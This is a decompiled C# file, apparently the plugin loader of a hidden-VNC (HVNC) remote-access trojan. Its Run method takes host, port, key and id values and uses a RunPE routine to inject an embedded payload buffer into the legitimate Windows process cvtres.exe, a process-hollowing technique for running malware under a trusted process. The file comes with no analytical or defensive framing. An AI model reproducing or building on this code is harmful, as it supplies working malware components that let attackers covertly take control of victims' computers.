using System;
using System.Diagnostics;
using System.IO;

namespace HVNC
{
	// Token: 0x02000009 RID: 9
	public class Plugin
	{
		// Token: 0x06000013 RID: 19 RVA: 0x000021F4 File Offset: 0x000003F4
		public static object Run(string H, string P, string SL, string K, string id)
		{
			try
			{
				bool flag = File.Exists(Plugin.DotNet);
				if (flag)
				{
					RunPE.PERun(Plugin.DotNet, string.Concat(new string[]
					{
						H,
						" ",
						P,
						" ",
						K,
						" ",
						id
					}), DLLBuffer.rawData, false);
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			object result;
			return result;
		}

		// Token: 0x04000009 RID: 9
		public static string DotNet = Environment.GetEnvironmentVariable("windir") + "\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe";
	}
}
